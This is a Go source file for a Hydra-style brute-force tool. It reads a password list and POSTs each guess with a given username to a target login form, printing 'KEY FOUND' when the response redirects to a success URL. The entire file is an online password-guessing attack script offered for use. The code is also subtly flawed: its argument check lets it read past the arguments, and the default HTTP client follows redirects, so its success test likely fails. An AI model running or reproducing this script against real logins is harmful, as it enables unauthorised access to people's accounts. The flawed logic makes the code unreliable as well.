package main

import (
	"bufio"
	"fmt"
	"net/http"
	"os"
	"strings"
	"time"
)

func main() {
	// Example command-line arguments: hydra2.go -l username -P passwordlist url --redirect successurl
	args := os.Args
	if len(args) < 6 {
		fmt.Println("Usage: hydra2.go -l username -P passwordlist url --redirect successurl")
		return
	}

	username := args[2]
	passwordListFile := args[4]
	targetURL := args[5]
	successRedirectURL := args[7]

	// Open the password list
	file, err := os.Open(passwordListFile)
	if err != nil {
		fmt.Println("Error opening password list:", err)
		return
	}
	defer file.Close()

	// Scan the password list line by line
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		password := scanner.Text()
		fmt.Printf("Trying password: %s\n", password)

		// Try to authenticate with the current password
		if tryLogin(username, password, targetURL, successRedirectURL) {
			fmt.Printf("KEY FOUND: %s\n", password)
			break
		} else {
			fmt.Printf("KEY NOT FOUND for password: %s\n", password)
		}

		// Sleep to avoid overloading the server
		time.Sleep(1 * time.Second)
	}

	if err := scanner.Err(); err != nil {
		fmt.Println("Error reading password list:", err)
	}
}

// tryLogin sends a POST request with the given username and password, checking for the redirect URL
func tryLogin(username, password, targetURL, successRedirectURL string) bool {
	client := &http.Client{}
	data := fmt.Sprintf("username=%s&password=%s", username, password)

	// Create a POST request
	req, err := http.NewRequest("POST", targetURL, strings.NewReader(data))
	if err != nil {
		fmt.Println("Error creating request:", err)
		return false
	}

	// Set headers (you may need to customize this depending on the target)
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

	// Send the request
	resp, err := client.Do(req)
	if err != nil {
		fmt.Println("Error sending request:", err)
		return false
	}
	defer resp.Body.Close()

	// Check if the response indicates a redirect to the success URL
	if resp.StatusCode == http.StatusFound || resp.StatusCode == http.StatusMovedPermanently {
		location := resp.Header.Get("Location")
		if location == successRedirectURL {
			return true
		}
	}

	return false
}
